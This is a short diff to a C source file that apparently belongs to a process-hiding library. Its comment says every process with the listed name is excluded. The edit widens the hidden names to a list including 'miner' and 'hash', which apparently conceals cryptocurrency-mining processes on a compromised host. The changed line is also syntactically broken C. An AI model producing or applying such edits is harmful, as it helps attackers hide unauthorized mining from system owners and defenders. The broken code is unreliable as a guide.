@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "kopi";
+static const char* process_to_filter = "kopi";"gcraftcp";"kol";"hash";"miner"
 
 /*
  * Get a directory name given a DIR* handle
